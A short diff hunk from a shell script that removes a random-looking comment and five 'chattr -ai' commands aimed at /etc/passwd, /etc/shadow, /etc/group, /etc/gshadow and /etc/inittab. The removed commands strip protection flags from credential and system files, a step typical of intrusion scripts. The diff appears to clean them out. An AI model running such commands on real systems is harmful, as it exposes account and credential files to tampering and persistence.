@@ -715,18 +715,12 @@ if [[ $# -ge 1 ]]; then
 fi
 
 
-#Wo9MzTUT4YsYtXE5
 
 
 
 
 
 
-chattr -ai /etc/passwd
-chattr -ai /etc/shadow
-chattr -ai /etc/group
-chattr -ai /etc/gshadow
-chattr -ai /etc/inittab
 
 
 
